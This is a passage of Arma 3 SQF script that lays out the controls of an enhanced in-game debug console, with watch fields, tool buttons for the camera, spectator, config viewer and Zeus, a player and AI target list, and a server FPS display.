            _ctrlPos set[2, (_ctrlPos# 2) + 0.001];
            _ctrlPos set[3, (_ctrlPos# 3) + 0.004];
            _WatchBackground ctrlSetPosition _ctrlPos;
            _WatchBackground ctrlCommit 0;
            _WatchBackground ctrlEnable false;

            _WatchText = _display displayCtrl 11893;
            _ctrlPos = ctrlPosition _WatchText;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _WatchText ctrlSetPosition _ctrlPos;
            _WatchText ctrlCommit 0;

            _WatchInput1 = _display displayCtrl 12285;
            _ctrlPos = ctrlPosition _WatchInput1;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _WatchInput1 ctrlSetPosition _ctrlPos;
            _WatchInput1 ctrlCommit 0;

            _ctrlPos set[0, (_ctrlPos# 0) + 0.588];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.588];

            _ctrlPosB = [
                (_ctrlPos# 0),
                (_ctrlPos# 1),
                (_ctrlPos# 2),
                (_ctrlPos# 3) + 0.2813
            ];

            _WatchOutput1 = _display displayCtrl 12286;
            _watchButtonColor = ctrlBackgroundColor _WatchOutput1;

            _backgroundWatchButtons = _display ctrlCreate[''IGUIBack'', 14047, _ctrlGroupParent];
            _backgroundWatchButtons ctrlSetBackgroundColor _watchButtonColor;
            _backgroundWatchButtons ctrlSetPosition _ctrlPosB;
            _backgroundWatchButtons ctrlCommit 0;
            _backgroundWatchButtons ctrlEnable false;

            _ButtonWatch1 = _display ctrlCreate[''RscCheckBox'', 14004, _ctrlGroupParent];
            _ButtonWatch1 ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _ButtonWatch1 ctrlSetPosition _ctrlPos;
            _ButtonWatch1 ctrlSetStructuredText parseText format["<t align=''left'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\attributes\combopreview\play_ca.paa''></img><t/>", 0.93 * EDC_textSize];
            _ButtonWatch1 ctrlCommit 0;


            _ctrlPos = ctrlPosition _WatchInput1;
            _ctrlPos set[1, (_ctrlPos# 1) - 0.001];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.041];
            _WatchInput1 ctrlSetPosition _ctrlPos;
            _WatchInput1 ctrlCommit 0;


            _ctrlPos = ctrlPosition _WatchOutput1;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.042];
            _WatchOutput1 ctrlSetPosition _ctrlPos;
            _WatchOutput1 ctrlCommit 0;

            _WatchInput2 = _display displayCtrl 12287;
            _ctrlPos = ctrlPosition _WatchInput2;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _WatchInput2 ctrlSetPosition _ctrlPos;
            _WatchInput2 ctrlCommit 0;

            _ctrlPos set[0, (_ctrlPos# 0) + 0.588];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.588];



            _ButtonWatch2 = _display ctrlCreate[''RscCheckBox'', 14005, _ctrlGroupParent];

            _ButtonWatch2 ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _ButtonWatch2 ctrlSetPosition _ctrlPos;
            _ButtonWatch2 ctrlSetStructuredText parseText format["<t align=''left'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\attributes\combopreview\play_ca.paa''></img><t/>", 0.93 * EDC_textSize];
            _ButtonWatch2 ctrlCommit 0;

            _ctrlPos = ctrlPosition _WatchInput2;
            _ctrlPos set[2, (_ctrlPos# 2) - 0.041];
            _WatchInput2 ctrlSetPosition _ctrlPos;
            _WatchInput2 ctrlCommit 0;

            _WatchOutput2 = _display displayCtrl 12288;
            _ctrlPos = ctrlPosition _WatchOutput2;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.042];
            _WatchOutput2 ctrlSetPosition _ctrlPos;
            _WatchOutput2 ctrlCommit 0;

            _WatchInput3 = _display displayCtrl 12289;
            _ctrlPos = ctrlPosition _WatchInput3;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _WatchInput3 ctrlSetPosition _ctrlPos;
            _WatchInput3 ctrlCommit 0;

            _ctrlPos set[0, (_ctrlPos# 0) + 0.588];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.588];



            _ButtonWatch3 = _display ctrlCreate[''RscCheckBox'', 14006, _ctrlGroupParent];

            _ButtonWatch3 ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _ButtonWatch3 ctrlSetPosition _ctrlPos;
            _ButtonWatch3 ctrlSetStructuredText parseText format["<t align=''left'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\attributes\combopreview\play_ca.paa''></img><t/>", 0.93 * EDC_textSize];
            _ButtonWatch3 ctrlCommit 0;

            _ctrlPos = ctrlPosition _WatchInput3;
            _ctrlPos set[2, (_ctrlPos# 2) - 0.041];
            _WatchInput3 ctrlSetPosition _ctrlPos;
            _WatchInput3 ctrlCommit 0;

            _WatchOutput3 = _display displayCtrl 12290;
            _ctrlPos = ctrlPosition _WatchOutput3;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.042];
            _WatchOutput3 ctrlSetPosition _ctrlPos;
            _WatchOutput3 ctrlCommit 0;

            _WatchInput4 = _display displayCtrl 12291;
            _ctrlPos = ctrlPosition _WatchInput4;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];

            _WatchInput4 ctrlSetPosition _ctrlPos;
            _WatchInput4 ctrlCommit 0;

            _ctrlPos set[0, (_ctrlPos# 0) + 0.588];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.588];



            _ButtonWatch4 = _display ctrlCreate[''RscCheckBox'', 14007, _ctrlGroupParent];

            _ButtonWatch4 ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _ButtonWatch4 ctrlSetPosition _ctrlPos;
            _ButtonWatch4 ctrlSetStructuredText parseText format["<t align=''left'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\attributes\combopreview\play_ca.paa''></img><t/>", 0.93 * EDC_textSize];
            _ButtonWatch4 ctrlCommit 0;

            _ctrlPos = ctrlPosition _WatchInput4;
            _ctrlPos set[2, (_ctrlPos# 2) - 0.041];
            _WatchInput4 ctrlSetPosition _ctrlPos;
            _WatchInput4 ctrlCommit 0;

            _WatchOutput4 = _display displayCtrl 12293;
            _ctrlPos = ctrlPosition _WatchOutput4;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.042];
            _WatchOutput4 ctrlSetPosition _ctrlPos;
            _WatchOutput4 ctrlCommit 0;

            _watchTipText = ''Show Hint'';
            _watchTipShade = [0, 0, 0, 1];



            _ButtonWatch1 ctrlSetTooltipColorShade _watchTipShade;
            _ButtonWatch2 ctrlSetTooltipColorShade _watchTipShade;
            _ButtonWatch3 ctrlSetTooltipColorShade _watchTipShade;
            _ButtonWatch4 ctrlSetTooltipColorShade _watchTipShade;

            _ButtonWatch1 ctrlSetTooltip _watchTipText;
            _ButtonWatch2 ctrlSetTooltip _watchTipText;
            _ButtonWatch3 ctrlSetTooltip _watchTipText;
            _ButtonWatch4 ctrlSetTooltip _watchTipText;

            if (missionNamespace getVariable[''EDC_showWatch1'', false]) then {
                _ButtonWatch1 cbSetChecked true;
            };
            if (missionNamespace getVariable[''EDC_showWatch2'', false]) then {
                _ButtonWatch2 cbSetChecked true;
            };
            if (missionNamespace getVariable[''EDC_showWatch3'', false]) then {
                _ButtonWatch3 cbSetChecked true;
            };
            if (missionNamespace getVariable[''EDC_showWatch4'', false]) then {
                _ButtonWatch4 cbSetChecked true;
            };

            _ButtonWatch1 ctrlAddEventHandler["ButtonClick", {
                EDC_showWatch1 = !EDC_showWatch1;
            }];
            _ButtonWatch2 ctrlAddEventHandler["ButtonClick", {
                EDC_showWatch2 = !EDC_showWatch2;
            }];
            _ButtonWatch3 ctrlAddEventHandler["ButtonClick", {
                EDC_showWatch3 = !EDC_showWatch3;
            }];
            _ButtonWatch4 ctrlAddEventHandler["ButtonClick", {
                EDC_showWatch4 = !EDC_showWatch4;
            }];

            EDC_ctrls_watchInputs pushBack _WatchInput1;
            EDC_ctrls_watchInputs pushBack _WatchInput2;
            EDC_ctrls_watchInputs pushBack _WatchInput3;
            EDC_ctrls_watchInputs pushBack _WatchInput4;

            EDC_ctrls_watchOutputs pushBack _WatchOutput1;
            EDC_ctrls_watchOutputs pushBack _WatchOutput2;
            EDC_ctrls_watchOutputs pushBack _WatchOutput3;
            EDC_ctrls_watchOutputs pushBack _WatchOutput4;

            comment "//--- Load last values of watch fields and prepare watch fields"; {
                private _value = profileNamespace getVariable["RscDebugConsole_watch" + str(_forEachIndex + 1), [true, "", false]];
                if !(_value isEqualTypeParams[true, ""]) then {
                    _value = [true, _value, false]
                };
                comment "//backward compatibility";
                _x ctrlSetText(_value select 1);
                if (_value select 2) then {
                    ctrlSetFocus _x
                };
                _x setVariable["RscDebugConsole_watchStatus", _value];
            }
            forEach EDC_ctrls_watchInputs;

            EDC_LIMIT_WARNING = 0.003;
            EDC_COLOR_WARNING = [0.8, 0.4, 0, 0.5];
            EDC_LIMIT_CRITICAL = 0.1;
            EDC_COLOR_CRITICAL = [0.5, 0.1, 0, 0.8];
            EDC_WATCH_FIELD_FNC = {
                params[''_inputCtrl'', ''_outputCtrl''];
                private _display = findDisplay 49;
                [_inputCtrl, _outputCtrl] call(_display getVariable "RscDebugConsole_fnc_watchField");
            };

            _display setVariable["RscDebugConsole_fnc_watchField", {
                params["_input", "_output"];
                with uinamespace do {
                    _this = ctrlText _input;
                    if (_this isEqualTo "") exitWith {
                        _input ctrlSetBackgroundColor[0, 0, 0, 0];
                        _output ctrlSetText "";
                    };

                    if (_input getVariable["RscDebugConsole_watchPaused", false]) exitWith {
                        _input ctrlSetBackgroundColor EDC_COLOR_CRITICAL;
                        _output ctrlSetText "";
                    };

                    _status = _input getVariable "RscDebugConsole_watchStatus";
                    if (!(_status select 0) && {
                            _status select 1 isEqualTo _this
                        }) exitWith {
                        _input ctrlSetBackgroundColor EDC_COLOR_CRITICAL
                    };

                    _duration = diag_tickTime;
                    _duration = compile _this call {
                        _output ctrlSetText str([nil] apply {
                                private["_input", "_output", "_status", "_duration"];
                                [] call _this
                            }
                            param[0, text ""]);
                        diag_tickTime - _duration
                    };

                    if (_duration < EDC_LIMIT_WARNING) exitWith {
                        _input ctrlSetBackgroundColor[0, 0, 0, 0];
                        _status set[0, true];
                    };

                    _input ctrlSetBackgroundColor EDC_COLOR_WARNING;
                    _status set[0, false];

                    if (_duration > EDC_LIMIT_CRITICAL) exitWith {
                        _status set[1, _this]
                    };

                    _status set[1, ""];
                };
            }];

            comment "//--- Process watch fields";

            _display displayAddEventHandler["MouseMoving", {
                ([(uiNamespace getVariable[''EDC_ctrls_watchInputs'', []])# 0, (uiNamespace getVariable[''EDC_ctrls_watchOutputs'', []])# 0]) call(uiNamespace getVariable[''EDC_WATCH_FIELD_FNC'', {}])
            }];
            _display displayAddEventHandler["MouseHolding", {
                ([(uiNamespace getVariable[''EDC_ctrls_watchInputs'', []])# 0, (uiNamespace getVariable[''EDC_ctrls_watchOutputs'', []])# 0]) call(uiNamespace getVariable[''EDC_WATCH_FIELD_FNC'', {}])
            }];
            _display displayAddEventHandler["MouseMoving", {
                ([(uiNamespace getVariable[''EDC_ctrls_watchInputs'', []])# 1, (uiNamespace getVariable[''EDC_ctrls_watchOutputs'', []])# 1]) call(uiNamespace getVariable[''EDC_WATCH_FIELD_FNC'', {}])
            }];
            _display displayAddEventHandler["MouseHolding", {
                ([(uiNamespace getVariable[''EDC_ctrls_watchInputs'', []])# 1, (uiNamespace getVariable[''EDC_ctrls_watchOutputs'', []])# 1]) call(uiNamespace getVariable[''EDC_WATCH_FIELD_FNC'', {}])
            }];
            _display displayAddEventHandler["MouseMoving", {
                ([(uiNamespace getVariable[''EDC_ctrls_watchInputs'', []])# 2, (uiNamespace getVariable[''EDC_ctrls_watchOutputs'', []])# 2]) call(uiNamespace getVariable[''EDC_WATCH_FIELD_FNC'', {}])
            }];
            _display displayAddEventHandler["MouseHolding", {
                ([(uiNamespace getVariable[''EDC_ctrls_watchInputs'', []])# 2, (uiNamespace getVariable[''EDC_ctrls_watchOutputs'', []])# 2]) call(uiNamespace getVariable[''EDC_WATCH_FIELD_FNC'', {}])
            }];
            _display displayAddEventHandler["MouseMoving", {
                ([(uiNamespace getVariable[''EDC_ctrls_watchInputs'', []])# 3, (uiNamespace getVariable[''EDC_ctrls_watchOutputs'', []])# 3]) call(uiNamespace getVariable[''EDC_WATCH_FIELD_FNC'', {}])
            }];
            _display displayAddEventHandler["MouseHolding", {
                ([(uiNamespace getVariable[''EDC_ctrls_watchInputs'', []])# 3, (uiNamespace getVariable[''EDC_ctrls_watchOutputs'', []])# 3]) call(uiNamespace getVariable[''EDC_WATCH_FIELD_FNC'', {}])
            }];












            _ButtonSpectatorCamera = _display displayCtrl 13287;
            _ctrlPos = ctrlPosition _ButtonSpectatorCamera;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ButtonSpectatorCamera ctrlSetPosition _ctrlPos;
            _ButtonSpectatorCamera ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\vision_normal_ca.paa''></img>  SPECTATOR<t/>", 1.05 * EDC_textSize];

            _ButtonSpectatorCamera ctrlAddEventHandler["ButtonClick", {


                ctrlParent(_this select 0) closeDisplay 2;

                if ((["IsInitialized"] call BIS_fnc_EGSpectator) or(!isNull findDisplay 60492)) exitWith {
                    ["Terminate"] call BIS_fnc_EGSpectator;
                    findDisplay 60492 closeDisplay 2;
                };

                ["Initialize", [player, nil, true, true]] spawn BIS_fnc_EGSpectator;

            }];
            _ButtonSpectatorCamera ctrlCommit 0;

            _extBtnColor = ctrlBackgroundColor _ButtonSpectatorCamera;

            _ButtonFunctions = _display displayCtrl 13289;
            _ctrlPos = ctrlPosition _ButtonFunctions;
            _ctrlPos set[0, (_ctrlPos# 0) - 0.001];
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ButtonFunctions ctrlSetPosition _ctrlPos;
            _ButtonFunctions ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\entitymenu\functions_ca.paa''></img>  FUNCTIONS<t/>", 1.05 * EDC_textSize];
            _ButtonFunctions ctrlAddEventHandler["ButtonClick", {

                [ctrlParent(_this select 0)] spawn(uiNamespace getVariable "BIS_fnc_help");

            }];

            _ButtonFunctions ctrlCommit 0;

            _ButtonAnimations = _display displayCtrl 13291;
            _ctrlPos = ctrlPosition _ButtonAnimations;
            _ctrlPos set[0, (_ctrlPos# 0) - 0.001];
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ctrlPos set[2, (_ctrlPos# 2) + 0.002];
            _ButtonAnimations ctrlSetPosition _ctrlPos;
            _ButtonAnimations ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\ui_f\data\IGUI\Cfg\mptable\infantry_ca.paa''></img>  ANIMATIONS<t/>", 1.05 * EDC_textSize];
            _ButtonAnimations ctrlAddEventHandler["ButtonClick", {

                [] spawn(uiNamespace getVariable "BIS_fnc_animViewer");

            }];

            _ButtonAnimations ctrlCommit 0;








            _ButtonSplendidCamera = _display displayCtrl 13288;
            _ctrlPos = ctrlPosition _ButtonSplendidCamera;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown + 0.001];
            _ButtonSplendidCamera ctrlSetPosition _ctrlPos;
            _ButtonSplendidCamera ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\entitymenu\moveCamera_ca.paa''></img>  CAMERA<t/>", 1.05 * EDC_textSize];

            _ButtonSplendidCamera ctrlAddEventHandler["ButtonClick", {


                ctrlParent(_this select 0) closeDisplay 2;

                if (isNull findDisplay 314) then {
                    [] spawn(uiNamespace getVariable "BIS_fnc_camera");
                } else {
                    comment "[''Exit''] call BIS_fnc_camera;";
                    findDisplay 314 closeDisplay 2;
                };

            }];

            _ButtonSplendidCamera ctrlCommit 0;

            _ButtonConfig = _display displayCtrl 13290;
            _ctrlPos = ctrlPosition _ButtonConfig;
            _ctrlPos set[0, (_ctrlPos# 0) - 0.001];
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown + 0.001];
            _ButtonConfig ctrlSetPosition _ctrlPos;
            _ButtonConfig ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\displays\display3den\entitymenu\findConfig_ca.paa''></img>  CONFIGS<t/>", 1.05 * EDC_textSize];
            _ButtonConfig ctrlAddEventHandler["ButtonClick", {

                [ctrlParent(_this select 0)] spawn(uiNamespace getVariable "BIS_fnc_configViewer");

            }];

            _ButtonConfig ctrlCommit 0;

            _ButtonGUI = _display displayCtrl 13292;
            _ctrlPos = ctrlPosition _ButtonGUI;
            _ctrlPos set[0, (_ctrlPos# 0) - 0.001];
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown + 0.001];
            _ctrlPos set[2, (_ctrlPos# 2) + 0.002];
            _ButtonGUI ctrlSetPosition _ctrlPos;
            _ButtonGUI ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\controls\CtrlCheckbox\textureUnchecked_ca.paa''></img>  GUI EDITOR<t/>", 1.05 * EDC_textSize];
            _ButtonGUI ctrlAddEventHandler["ButtonClick", {

                [] spawn BIS_fnc_guiEditor;
                ctrlParent(_this select 0) closeDisplay 2;

            }];
            _ButtonGUI ctrlCommit 0;

            _ButtonZeus = _display ctrlCreate[''RscButtonMenu'', 14000, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition _ButtonExecuteTarget) select 0),
                ((ctrlPosition _ButtonAnimations) select 1),
                ((ctrlPosition _ButtonExecuteTarget) select 2),
                ((ctrlPosition _ButtonAnimations) select 3)
            ];
            _ButtonZeus ctrlSetBackgroundColor _extBtnColor;
            _ButtonZeus ctrlSetPosition _ctrlPos;
            _ButtonZeus ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\ui_f_curator\data\logos\arma3_curator_eye_64_ca.paa''></img>  ZEUS<t/>", 1.05 * EDC_textSize];
            _ButtonZeus ctrlAddEventHandler["ButtonClick", {
                ctrlParent(_this select 0) closeDisplay 2;
                [] spawn {
                    _pauseMenu = findDisplay 49;
                    _pauseMenu closeDisplay 0;
                    waitUntil {
                        (isNull _pauseMenu)
                    };
                    if (!isNull(findDisplay 312)) exitWith {};
                    [] call EDC_fnc_openZeus;
                };
            }];
            _ButtonZeus ctrlCommit 0;

            _ButtonUtils = _display ctrlCreate[''RscButtonMenu'', 14001, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition _ButtonExecuteTarget) select 0),
                ((ctrlPosition _ButtonGUI) select 1),
                ((ctrlPosition _ButtonExecuteTarget) select 2),
                ((ctrlPosition _ButtonGUI) select 3)
            ];
            _ButtonUtils ctrlSetBackgroundColor _extBtnColor;
            _ButtonUtils ctrlSetPosition _ctrlPos;
            _ButtonUtils ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#70FFFFFF'' size=''%1''><img image=''\a3\3den\data\Cfg3DEN\History\changeAttributes_ca.paa''></img>  TOOLS (WIP)<t/>", 1.05 * EDC_textSize];
            _ButtonUtils ctrlCommit 0;
            _ButtonUtils ctrlEnable false;

            _ButtonSaveSQF = _display ctrlCreate[''RscButtonMenu'', 14002, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition _ComboSelectTargetType) select 0),
                ((ctrlPosition _ButtonAnimations) select 1),
                ((ctrlPosition _ComboSelectTargetType) select 2),
                ((ctrlPosition _ButtonAnimations) select 3)
            ];
            _ButtonSaveSQF ctrlSetBackgroundColor _extBtnColor;
            _ButtonSaveSQF ctrlSetPosition _ctrlPos;
            _ButtonSaveSQF ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\save_ca.paa''></img>  SAVE SQF<t/>", 1.05 * EDC_textSize];
            _ButtonSaveSQF ctrlAddEventHandler["ButtonClick", {
                params["_control"];
                with uiNamespace do {
                    private _currentExpression = ctrlText EDC_expression;
                    with missionnamespace do {
                        [_currentExpression] spawn EDC_fnc_saveScript;
                    };
                };
            }];
            _ButtonSaveSQF ctrlCommit 0;

            _ButtonLoadSQF = _display ctrlCreate[''RscButtonMenu'', 14003, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition _ComboSelectTargetType) select 0),
                ((ctrlPosition _ButtonGUI) select 1),
                ((ctrlPosition _ComboSelectTargetType) select 2),
                ((ctrlPosition _ButtonGUI) select 3)
            ];
            _ButtonLoadSQF ctrlSetBackgroundColor _extBtnColor;
            _ButtonLoadSQF ctrlSetPosition _ctrlPos;
            _ButtonLoadSQF ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\open_ca.paa''></img>  LOAD SQF<t/>", 1.05 * EDC_textSize];
            _ButtonLoadSQF ctrlAddEventHandler["ButtonClick", {
                params["_control"];
                [] spawn EDC_fnc_loadScript;
            }];
            _ButtonLoadSQF ctrlCommit 0;



            _Title_unitList = _display ctrlCreate[''RscStructuredText'', 14010, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _Title;
            _ctrlPos set[0, (_ctrlPos# 0) + 0.664];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.240];
            _Title_unitList ctrlSetBackgroundColor EDC_defaultColor;
            _Title_unitList ctrlSetPosition _ctrlPos;
            _Title_unitList ctrlSetStructuredText parseText format["<t align=''left''><t font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\ui_f\data\Map\Diary\Icons\playerVirtual_ca.paa''></img><t align=''center''>Target List<t align=''right''><t font=''puristaMedium'' size=''%1''><img image=''a3\3den\data\displays\Display3DEN\PanelRight\modeGroups_ca.paa''></img><t/>", EDC_textSize * 1.05, EDC_textSize * 0.8];
            _Title_unitList ctrlCommit 0;


            _UnitListBackground = _display ctrlCreate[''IGUIBack'', 14012, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _ExpressionBackground;
            _ctrlPos set[0, (_ctrlPos# 0) + 0.664];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.240];
            _UnitListBackground ctrlSetBackgroundColor(ctrlBackgroundColor _ExpressionBackground);
            _UnitListBackground ctrlSetPosition _ctrlPos;
            _UnitListBackground ctrlCommit 0;
            _UnitListBackground ctrlEnable false;


            _UnitListFrame = _display ctrlCreate["RscFrame", 14015, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _Expression;
            _ctrlPos set[0, (_ctrlPos# 0) + 0.664];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.240];
            _UnitListFrame ctrlSetTextColor[1, 1, 1, 1];
            _UnitListFrame ctrlSetPosition _ctrlPos;
            _UnitListFrame ctrlCommit 0;

            EDC_ctrl_targetLB = _display ctrlCreate["RscListbox", 14014, _ctrlGroupParent];
            EDC_ctrl_targetLB ctrlSetPosition _ctrlPos;
            EDC_ctrl_targetLB ctrlAddEventHandler[''LBSelChanged'', {
                params["_control", "_selectedIndex"];

                if ((_control lbData _selectedIndex) != '''') then {

                    switch (missionnamespace getVariable[''EDC_listWhat'', ''players'']) do {
                        case ''players'':{
                                {
                                    if ((_x getVariable[''EDC_listIndex'', -1]) == _selectedIndex) exitWith {
                                        call EDC_fnc_unhighlightAllObjects;
                                        [_x] call EDC_fnc_highlightObjects;
                                    };
                                }
                                forEach allPlayers;
                            };
                        case ''ai'':{
                                private _agents = []; {
                                    if (isAgent(teamMember _x)) then {
                                        _agents pushBack _x;
                                    };
                                }
                                forEach entities ''man''; {
                                    if ((_x getVariable[''EDC_listIndex'', -1]) == _selectedIndex) exitWith {
                                        call EDC_fnc_unhighlightAllObjects;
                                        [_x] call EDC_fnc_highlightObjects;
                                    };
                                }
                                forEach((allUnits - allPlayers) + _agents);
                            };
                    };
                } else {
                    call EDC_fnc_unhighlightAllObjects;
                };

            }];
            EDC_ctrl_targetLB ctrlCommit 0;

            _UnitListCombo = _display ctrlCreate[''RscCombo'', 14013, _ctrlGroupParent];
            EDC_UnitListCombo = _UnitListCombo;
            _UnitListCombo ctrlSetBackgroundColor[0, 0, 0, 0.9];
            _ctrlPos = ctrlPosition _ExpressionOutput;
            _ctrlPos set[0, (_ctrlPos# 0) + 0.664];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.240];
            _UnitListCombo ctrlSetPosition _ctrlPos;
            _UnitListCombo ctrlSetFont ''EtelkaMonospacePro'';
            _UnitListCombo ctrlSetFontHeight 0.03;
            _index0 = _UnitListCombo lbAdd "List: Players";
            _index1 = _UnitListCombo lbAdd "List: AI";
            _UnitListCombo ctrlAddEventHandler[''LBSelChanged'', {
                params["_control", "_selectedIndex"];

                switch (_control lbText _selectedIndex) do {
                    case ''List: Players'':{
                            missionnamespace setVariable[''EDC_listWhat'', ''players''];

                            [] call(missionNamespace getVariable[''EDC_fnc_listPlayers_GUI'', {}]);
                        };

                    case ''List: AI'':{

                            missionnamespace setVariable[''EDC_listWhat'', ''ai''];

                            [] call(missionNamespace getVariable[''EDC_fnc_listAI_GUI'', {}]);
                        };


                };

            }];

            _UnitListCombo ctrlCommit 0;

            switch (missionnamespace getVariable[''EDC_listWhat'', ''players'']) do {
                case ''players'':{
                        _UnitListCombo lbSetCurSel _index0;
                        [] call(missionNamespace getVariable[''EDC_fnc_listPlayers_GUI'', {}]);
                    };
                case ''ai'':{
                        _UnitListCombo lbSetCurSel _index1;
                        [] call(missionNamespace getVariable[''EDC_fnc_listAI_GUI'', {}]);
                    };
            };





            EDC_PerformanceMetricsBackground = _display ctrlCreate[''IGUIBack'', 14016, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _WatchBackground;
            _ctrlPos set[0, (_ctrlPos# 0) + 0.664];
            _ctrlPos set[2, (_ctrlPos# 2) - 0.24];
            EDC_PerformanceMetricsBackground ctrlSetBackgroundColor(ctrlBackgroundColor _WatchBackground);
            EDC_PerformanceMetricsBackground ctrlSetPosition _ctrlPos;
            EDC_PerformanceMetricsBackground ctrlCommit 0;
            EDC_PerformanceMetricsBackground ctrlEnable false;

            _PerfMetText = _display ctrlCreate[''RscStructuredText'', 14017, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition _watchText) select 0) + 0.664,
                ((ctrlPosition _watchText) select 1) - 0.004,
                ((ctrlPosition _watchText) select 2),
                ((ctrlPosition _watchText) select 3) + 0.003
            ];
            _PerfMetText ctrlSetBackgroundColor[0, 0, 0, 0];
            _PerfMetText ctrlSetPosition _ctrlPos;
            _PerfMetText ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''1'' color=''#FFFFFF'' size=''%1''>Performance Metrics:<t/>", 0.84 * EDC_textSize];
            _PerfMetText ctrlCommit 0;


            EDC_PerfMetServerFPS = _display ctrlCreate[''RscStructuredText'', 14018, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition _WatchInput1) select 0) + 0.663,
                ((ctrlPosition _WatchInput1) select 1),
                ((ctrlPosition _WatchInput1) select 2) - 0.239,
                ((ctrlPosition _WatchInput1) select 3)
            ];
            EDC_PerfMetServerFPS ctrlSetBackgroundColor[0.05, 0.1, 0.05, 0.8];
            EDC_PerfMetServerFPS ctrlSetPosition _ctrlPos;
            EDC_PerfMetServerFPS ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Server FPS<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetServerFPS ctrlCommit 0;

            [] call(missionnamespace getVariable[''EDC_fnc_updateServerFPS'', {}]);


            _PerfMetServerFPSButton = _display ctrlCreate[''RscButtonMenu'', 14019, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetServerFPS) select 0) + ((ctrlPosition EDC_PerfMetServerFPS) select 2),
                ((ctrlPosition EDC_PerfMetServerFPS) select 1),
                ((ctrlPosition _ButtonWatch1) select 2) - 0.001,
                ((ctrlPosition EDC_PerfMetServerFPS) select 3)
            ];
            _PerfMetServerFPSButton ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _PerfMetServerFPSButton ctrlSetPosition _ctrlPos;
            _PerfMetServerFPSButton ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaSemiBold'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\cfgwaypoints\cycle_ca.paa''></img><t/>", 0.95 * EDC_textSize];
            _PerfMetServerFPSButton ctrlSetTooltipColorText[1, 1, 1, 1];
            _PerfMetServerFPSButton ctrlSetTooltipColorBox[0, 1, 0, 1];
